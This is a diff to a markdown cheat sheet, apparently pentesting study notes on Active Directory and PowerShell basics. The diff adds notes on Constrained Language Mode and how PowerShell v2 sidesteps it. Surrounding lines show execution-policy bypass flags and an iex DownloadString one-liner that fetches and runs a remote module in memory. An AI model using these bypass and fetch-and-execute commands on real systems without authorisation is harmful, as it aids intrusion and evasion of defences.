@@ -1,4 +1,4 @@
-# AD Basics & PowerShell Basics
+# AD - Basics & PowerShell Basics
 
 ## AD Basics
 
@@ -52,7 +52,18 @@ powershell -ep bypass\
 Powershell -c \<cmd>\
 Powersehll -encodedcommand $env:PSExecutionPolicyPreference="bypass"
 
-&#x20;
+### Language Mode
+
+**Display current language mode**\
+$executioncontext.sessionstate.languagemode
+
+Constrained Language mode is the restriction of types which are not safe/disallowed in constrained language mode. E.g. .Net Classes,\
+Only Built-In Commandlets can be used and types/classes etc. are restricted\
+Can be configured via AppLoker or Windows Defender Application Mode in Enforcement mode.
+
+Constrained language mode is only for Powershellv5.1, v7 - if attacker can run Powershellv2 no language mode enforcement is possible.
+
+****
 
 ### Execute .PS1 File / PowerView
 
@@ -75,8 +86,6 @@ Get-AD-User -Identity username1 -Properties \*
 {% endhint %}
 
 \
-
-
 iex (new-Object Net.WebClient).DownloadString('[https://raw.githubusercontent.com/samratashok/ADModule/master/Import-ActiveDirectory.ps1');Import-ActiveDirectory](https://raw.githubusercontent.com/samratashok/ADModule/master/Import-ActiveDirectory.ps1'\);Import-ActiveDirectory)
 
 To be able to list all the cmdlets in the module, import the module as well. Remember to import the DLL first.\
@@ -86,13 +95,14 @@ Get-Command -Module ActiveDirectory
 
 ### Module
 
-Import a module/file\
+**Import a module/file**\
 Import-Module \<modulepath>
 
-List all commands of a module:\
+**List all commands of a module**\
 Get-Command -Module \<modulename>
 
-&#x20;
+**Display Loaded functions**\
+ls function:
 
 ### Download and execute PowerShell Scripts
 
